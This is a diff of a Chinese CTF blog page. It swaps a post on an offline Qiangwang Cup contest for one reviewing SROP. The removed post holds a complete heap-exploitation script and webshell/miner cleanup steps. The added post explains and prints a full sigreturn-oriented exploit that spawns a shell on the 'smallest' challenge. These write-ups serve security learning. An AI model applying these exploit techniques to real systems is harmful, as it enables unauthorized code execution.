@@ -11,7 +11,7 @@
         name="viewport"
         content="width=device-width, initial-scale=1, maximum-scale=1"
       />
-      <title>第四届广东省强网杯线下pwn |  H.greed</title>
+      <title>srop复习 |  H.greed</title>
   <meta name="generator" content="hexo-theme-ayer">
       
       <link rel="shortcut icon" href="https://user-images.githubusercontent.com/72968793/136398013-abf88785-b056-4f51-aa15-a8ee261f5c7f.jpg" />
@@ -54,7 +54,7 @@
     <main class="content on">
       <section class="outer">
   <article
-  id="post-第四届广东省强网杯线下pwn"
+  id="post-srop复习"
   class="article article-type-post"
   itemscope
   itemprop="blogPost"
@@ -65,7 +65,7 @@
     <header class="article-header">
        
 <h1 class="article-title sea-center" style="border-left:0" itemprop="name">
-  第四届广东省强网杯线下pwn
+  srop复习
 </h1>
  
 
@@ -73,15 +73,15 @@
     </header>
      
     <div class="article-meta">
-      <a href="/2021/11/15/%E7%AC%AC%E5%9B%9B%E5%B1%8A%E5%B9%BF%E4%B8%9C%E7%9C%81%E5%BC%BA%E7%BD%91%E6%9D%AF%E7%BA%BF%E4%B8%8Bpwn/" class="article-date">
-  <time datetime="2021-11-15T06:04:48.000Z" itemprop="datePublished">2021-11-15</time>
+      <a href="/2021/11/21/srop%E5%A4%8D%E4%B9%A0/" class="article-date">
+  <time datetime="2021-11-21T12:35:25.000Z" itemprop="datePublished">2021-11-21</time>
 </a>   
 <div class="word_count">
     <span class="post-time">
         <span class="post-meta-item-icon">
             <i class="ri-quill-pen-line"></i>
             <span class="post-meta-item-text"> Word count:</span>
-            <span class="post-count">635</span>
+            <span class="post-count">746</span>
         </span>
     </span>
 
@@ -90,7 +90,7 @@
         <span class="post-meta-item-icon">
             <i class="ri-book-open-line"></i>
             <span class="post-meta-item-text"> Reading time≈</span>
-            <span class="post-count">2 min</span>
+            <span class="post-count">3 min</span>
         </span>
     </span>
 </div>
@@ -105,40 +105,32 @@
   
     <div class="article-entry" itemprop="articleBody">
        
-  <p>这次啊去送人头了(╥╯^╰╥)</p>
+  <p>之前看过srop刚入门的时候，对于寄存器，栈那些都不是很懂。</p>
+<p>现在再看一遍，拿道题过下，发现其实就是发送信号控制栈传参</p>
 <span id="more"></span>
 
-<h1 id="rheap"><a href="#rheap" class="headerlink" title="rheap"></a>rheap</h1><p>这个题目很恶心，rust pwn，漏洞点是fuzz出来的UAF和堆溢出，最恶心的是输出的时候</p>
-<p>他用了编码加密，先latin-1再utf-8所以接受到数据要逆编码，编码加密怎么看出来的我是没去看了，官方给了exp</p>
-<p>吐口谈，呸，要题目的可以去我的靶场</p>
-<p><a target="_blank" rel="noopener" href="https://hexian2001.github.io/greedpwn/">https://hexian2001.github.io/greedpwn/</a></p>
-<h2 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="comment">#r=process(&#x27;./rheap.bak&#x27;)</span></span><br><span class="line">libc=ELF(<span class="string">&#x27;libc-2.27.so&#x27;</span>)</span><br><span class="line">r=remote(<span class="string">&#x27;47.107.51.210&#x27;</span>,<span class="number">13006</span>)</span><br><span class="line"><span class="comment">#context.log_level=&#x27;debug&#x27;</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span>(<span class="params">size</span>):</span></span><br><span class="line">	r.recvuntil(<span class="string">&quot;Your choice: &quot;</span>)</span><br><span class="line">	r.sendline(<span class="built_in">str</span>(<span class="number">1</span>))</span><br><span class="line">	r.recv()</span><br><span class="line">	r.sendline(<span class="built_in">str</span>(size))</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">edit</span>(<span class="params">idx,lens,con</span>):</span></span><br><span class="line">	r.recvuntil(<span class="string">&quot;Your choice: &quot;</span>)</span><br><span class="line">	r.sendline(<span class="built_in">str</span>(<span class="number">2</span>))</span><br><span class="line">	r.recv()</span><br><span class="line">	r.sendline(<span class="built_in">str</span>(idx))</span><br><span class="line">	r.recv()</span><br><span class="line">	r.sendline(<span class="built_in">str</span>(lens))</span><br><span class="line">	r.recv()</span><br><span class="line">	r.send(con)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">dele</span>(<span class="params">idx</span>):</span></span><br><span class="line">	r.recvuntil(<span class="string">&quot;Your choice: &quot;</span>)</span><br><span class="line">	r.sendline(<span class="built_in">str</span>(<span class="number">3</span>))</span><br><span class="line">	r.recv()</span><br><span class="line">	r.sendline(<span class="built_in">str</span>(idx))</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show</span>(<span class="params">idx</span>):</span></span><br><span class="line">	r.recvuntil(<span class="string">&quot;Your choice: &quot;</span>)</span><br><span class="line">	r.sendline(<span class="built_in">str</span>(<span class="number">4</span>))</span><br><span class="line">	r.recv()</span><br><span class="line">	r.sendline(<span class="built_in">str</span>(idx))</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">8</span>): </span><br><span class="line">	add(<span class="number">0x100</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">8</span>):</span><br><span class="line">	dele(<span class="number">7</span> - i)</span><br><span class="line">show(<span class="number">0</span>) </span><br><span class="line">r.recvuntil(<span class="string">&quot;Content: &quot;</span>)</span><br><span class="line">leak=u64(r.recv(<span class="number">10</span>).decode(<span class="string">&quot;utf-8&quot;</span>).encode(<span class="string">&#x27;latin-1&#x27;</span>).ljust(<span class="number">8</span>, <span class="string">&quot;\x00&quot;</span>)) - <span class="number">0x3ebca0</span></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(leak))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">add(<span class="number">0x100</span>)<span class="comment">#8</span></span><br><span class="line">add(<span class="number">0x100</span>)<span class="comment">#9</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">8</span>): </span><br><span class="line">	add(<span class="number">0x68</span>) </span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">8</span>): </span><br><span class="line">	dele(i + <span class="number">10</span>)</span><br><span class="line"></span><br><span class="line">edit(<span class="number">17</span>,<span class="number">1000</span>,p64(leak+libc.symbols[<span class="string">&#x27;__memalign_hook&#x27;</span>] - <span class="number">3</span>) + <span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line">add(<span class="number">0x68</span>)</span><br><span class="line">add(<span class="number">0x68</span>) </span><br><span class="line">edit(<span class="number">19</span>,<span class="number">1000</span>,<span class="string">b&quot;\x00&quot;</span>* <span class="number">3</span> + p64(leak + <span class="number">0x10a41c</span>) + <span class="string">&quot;\n&quot;</span>)</span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure>
+<h1 id="360chunqiu2017-smallest"><a href="#360chunqiu2017-smallest" class="headerlink" title="360chunqiu2017_smallest"></a>360chunqiu2017_smallest</h1><p>就一个syscall调用read</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">signed</span> __int64 <span class="title">start</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">void</span> *retaddr; <span class="comment">// [rsp+0h] [rbp+0h] BYREF</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> sys_read(<span class="number">0</span>, (<span class="keyword">char</span> *)&amp;retaddr, <span class="number">0x400</span>uLL);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
 
-<h1 id="运维"><a href="#运维" class="headerlink" title="运维"></a>运维</h1><p>一、 选手信息</p>
-<p>二、 分析过程</p>
-<p>1、首先连上ssh服务之后访问/var/www/html发现有一个.2.php后门，删掉之后发现还会创建，</p>
-<p><img src="https://user-images.githubusercontent.com/72968793/141731530-878fe392-e887-41cf-a5a4-0bf08646c60a.png" alt="image"> </p>
-<p>是不死马，先把PHP进程结束掉，再启动PHP进程，就可以杀掉不死马了。</p>
-<p>2、删掉泄露信息的PHPINFO文件</p>
-<p><img src="https://user-images.githubusercontent.com/72968793/141731552-e5f1cbb0-c3fb-47b5-8d55-b3814d959ec7.png" alt="image"> </p>
-<p>3、ez_serialize.php</p>
-<p>有反序列化漏洞和变量覆盖问题，</p>
-<p>如图修改注释掉变量覆盖点，</p>
-<p>以及给cmd参数加一个过滤。</p>
-<p><img src="https://user-images.githubusercontent.com/72968793/141731597-a9a001c1-c033-4452-b733-1156ab91cc08.png" alt="image"> </p>
-<p>4、查看启动文件start.sh发现新的web服务在/home里面</p>
-<p>在WEB4目录的test文件下有这几个后门，删掉即可</p>
-<p><img src="file:///C:\Users\20138\AppData\Local\Temp\ksohtml17976\wps4.jpg" alt="img"> </p>
-<p>5、ps -Af 查看进程</p>
-<p>kill掉VIM后门</p>
-<p>6、PS查看进程</p>
-<p>杀掉挖门罗币的挖矿木马，以及c3pool目录下的挖矿木马文件。</p>
-<p>7、查看进程发现有python后门</p>
-<p>杀掉之后发现会反复重启crontab -u ctf -e 发现有定时任务，删掉这个定时任务的配置。</p>
-<p>8、清除tmp目录下的后门文件</p>
-<p>发现/tmp目录下有门罗币的挖矿病毒，删掉病毒 同时kill掉进程。</p>
-<p>9、删除.xxx这些可能存留后门文件的文件，以及hh，prism这些疑似后门的elf文件</p>
-<p><img src="https://user-images.githubusercontent.com/72968793/141731703-be6baca7-1771-40a8-ae5f-d3775d9f65c2.png" alt="image"> </p>
+<p>看汇编吧</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">public start</span><br><span class="line">proc near               ; DATA XREF: LOAD:0000000000400018↑o</span><br><span class="line">xor     rax, rax</span><br><span class="line">mov     edx, 400h       ; count</span><br><span class="line">mov     rsi, rsp        ; buf ;东西直接存放于栈，其实看ida反汇编注释也可以看见</span><br><span class="line">mov     rdi, rax        ; fd</span><br><span class="line">syscall                 ; LINUX - sys_read</span><br><span class="line">retn</span><br></pre></td></tr></table></figure>
+
+<p>就非常简单的一个函数调用，程序除此外没别的东西，那有系统调用又没别的pop，只能去用srop了</p>
+<p>这里再说一句，其实srop就是一个汇编层面的一个立体表象的运用。</p>
+<p>我们可以看见第一个命令xor     rax, rax，其实就是一个对rax置零的操作，固定调用read</p>
+<p>我们可以直接把rax不执行xor那个命令变成1(因为rax本身也是计数寄存器啦，传入1个字符或者一个字节就会变成1 了就这个题目设计的很巧，传入’\xb3’一个字节绕过xor)，这样我就获取到了write了可以泄露地址了，我们可以看见第二个参数</p>
+<p>read(0,rsp,0x400);是rsp那么我们破坏rax后就是write(0,rsp,0x400);就有了rsp的地址，等下srop直接用</p>
+<p>上述的实现方法就是传入2个start函数地址就行了，但是我们还要继续输入呀，所以一共传入3个。</p>
+<p>接着因为刚才传入了3个read，我们传入0xb3(把程序返回地址改为4000B3                 mov     edx, 400h       ; count)</p>
+<p>给第二个read就是为了完成跳过执行xor，第一个用来当junk code压栈去了</p>
+<p>我们继续就是构造srop了用pwntools的工具SigreturnFrame()</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">frame = SigreturnFrame()</span><br><span class="line">frame.rax = constants.SYS_read <span class="comment">#0 syscall的调用什么函数是根据rax判断的这里我们还要继续输入当然要用read</span></span><br><span class="line">frame.rdi = <span class="number">0</span></span><br><span class="line">frame.rsi = leak</span><br><span class="line">frame.rdx = <span class="number">0x400</span>  <span class="comment">#read 的3个参数</span></span><br><span class="line">frame.rsp = leak </span><br><span class="line">frame.rip = syscall</span><br><span class="line">payload2 = p64(read)+ p64(<span class="number">0</span>)+<span class="built_in">str</span>(frame)</span><br><span class="line">r.send(payload2)</span><br><span class="line">sigreturn = p64(syscall) + <span class="string">&#x27;b&#x27;</span>*<span class="number">7</span> <span class="comment">#为什么总数是15？因为是要sigreturn呀他的调用号是15，字符数量是会改变rax的</span></span><br><span class="line">r.send(sigreturn) </span><br></pre></td></tr></table></figure>
+
+<p>最后直接调用execve就行了</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">frame = SigreturnFrame()</span><br><span class="line">frame.rax = constants.SYS_execve</span><br><span class="line">frame.rdi = leak + <span class="number">0x120</span></span><br><span class="line">frame.rsi = <span class="number">0</span></span><br><span class="line">frame.rdx = <span class="number">0</span></span><br><span class="line">frame.rsp = leak</span><br><span class="line">frame.rip = syscall</span><br><span class="line">payload3 = p64(read) + <span class="string">&#x27;a&#x27;</span>*<span class="number">8</span> + <span class="built_in">str</span>(frame)</span><br><span class="line">payload3 = payload3.ljust(<span class="number">0x120</span>,<span class="string">&#x27;\x00&#x27;</span>)+ <span class="string">&#x27;/bin/sh\x00&#x27;</span></span><br><span class="line">r.send(payload3)</span><br><span class="line">r.send(sigreturn)</span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure>
+
+<h2 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">r=process(<span class="string">&#x27;./smallest&#x27;</span>)</span><br><span class="line"><span class="comment">#r=remote(&#x27;node4.buuoj.cn&#x27;,&#x27;28002&#x27;)</span></span><br><span class="line">elf = process(<span class="string">&#x27;./smallest&#x27;</span>)</span><br><span class="line">context.arch = <span class="string">&#x27;amd64&#x27;</span></span><br><span class="line">context.log_level=<span class="string">&#x27;debug&#x27;</span></span><br><span class="line">syscall = <span class="number">0x4000be</span></span><br><span class="line">read = <span class="number">0x4000b0</span></span><br><span class="line">ret=<span class="number">0x4000C0</span></span><br><span class="line">payload = p64(read)*<span class="number">3</span></span><br><span class="line">r.send(payload)</span><br><span class="line">r.send(<span class="string">&#x27;\xb3&#x27;</span>)</span><br><span class="line">leak = u64(r.recv()[<span class="number">0x8</span>:<span class="number">0x10</span>])</span><br><span class="line">log.info(<span class="built_in">hex</span>(leak))</span><br><span class="line">frame = SigreturnFrame()</span><br><span class="line">frame.rax = constants.SYS_read</span><br><span class="line">frame.rdi = <span class="number">0</span></span><br><span class="line">frame.rsi = leak</span><br><span class="line">frame.rdx = <span class="number">0x400</span></span><br><span class="line">frame.rsp = leak</span><br><span class="line">frame.rip = syscall</span><br><span class="line">payload2 = p64(read)+ p64(<span class="number">0</span>)+<span class="built_in">str</span>(frame)</span><br><span class="line">r.send(payload2)</span><br><span class="line">sigreturn = p64(syscall) + <span class="string">&#x27;b&#x27;</span>*<span class="number">7</span></span><br><span class="line">r.send(sigreturn)</span><br><span class="line">frame = SigreturnFrame()</span><br><span class="line">frame.rax = constants.SYS_execve</span><br><span class="line">frame.rdi = leak + <span class="number">0x120</span></span><br><span class="line">frame.rsi = <span class="number">0</span></span><br><span class="line">frame.rdx = <span class="number">0</span></span><br><span class="line">frame.rsp = leak</span><br><span class="line">frame.rip = syscall</span><br><span class="line">payload3 = p64(read) + <span class="string">&#x27;a&#x27;</span>*<span class="number">8</span> + <span class="built_in">str</span>(frame)</span><br><span class="line">payload3 = payload3.ljust(<span class="number">0x120</span>,<span class="string">&#x27;\x00&#x27;</span>)+ <span class="string">&#x27;/bin/sh\x00&#x27;</span></span><br><span class="line">r.send(payload3)</span><br><span class="line">r.send(sigreturn)</span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure>
+
  
       <!-- reward -->
       
@@ -203,7 +195,7 @@
     <a class="modal-close" href="javascript:;"><i class="ri-close-circle-line"></i></a>
     <p>扫一扫，分享到微信</p>
     <div class="wx-qrcode">
-      <img src="//api.qrserver.com/v1/create-qr-code/?size=150x150&data=https://hgreed.vip/2021/11/15/%E7%AC%AC%E5%9B%9B%E5%B1%8A%E5%B9%BF%E4%B8%9C%E7%9C%81%E5%BC%BA%E7%BD%91%E6%9D%AF%E7%BA%BF%E4%B8%8Bpwn/" alt="微信分享二维码">
+      <img src="//api.qrserver.com/v1/create-qr-code/?size=150x150&data=https://hgreed.vip/2021/11/21/srop%E5%A4%8D%E4%B9%A0/" alt="微信分享二维码">
     </div>
 </div>
 
@@ -214,19 +206,10 @@
    
   <nav class="article-nav">
     
+    
       <a href="/2021/11/21/2021%E8%A5%BF%E6%B9%96%E8%AE%BA%E5%89%91/" class="article-nav-link">
-        <strong class="article-nav-caption">上一篇</strong>
-        <div class="article-nav-title">
-          
-            2021西湖论剑
-          
-        </div>
-      </a>
-    
-    
-      <a href="/2021/11/14/%E6%B9%96%E6%B9%98%E6%9D%AF/" class="article-nav-link">
         <strong class="article-nav-caption">下一篇</strong>
-        <div class="article-nav-title">湖湘杯</div>
+        <div class="article-nav-title">2021西湖论剑</div>
       </a>
     
   </nav>
